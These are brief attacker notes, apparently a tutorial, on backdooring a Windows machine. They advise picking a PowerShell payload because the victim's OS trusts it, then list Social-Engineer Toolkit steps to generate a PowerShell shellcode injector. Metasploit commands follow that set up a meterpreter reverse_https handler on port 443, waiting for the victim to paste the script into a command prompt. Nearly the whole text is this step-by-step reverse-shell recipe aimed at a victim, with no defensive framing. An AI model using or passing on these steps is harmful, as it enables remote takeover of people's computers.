Dont use technology based payload eg.adobe as it is hard to predict if it is installed in victim machine
Instead use a payload that OS will trust eg powershell payload

>setoolkit
--------------------
generate a payload:

9) Powershell Attack Vectors
1) Powershell Alphanumeric Shellcode Injector
they are exported to /root/.set/reports/powershell
99 //exit

--------------------

create the listener/handler:
>msfconsole
msf>search type:exploit handler
msf>use multi/handler
msf exploit(handler)>show payloads
msf exploit(handler)>set payload windows/meterpreter/reverse_https
msf>set LPORT 443
msf>set LHOST 0.0.0.0
msf>set ExitOnSession false
msf>exploit -j  
Now we have to wait ,until victim runs the above powershell script in his machine.
copy the powershell content,paste it on cmd prompt,then backdoor will open
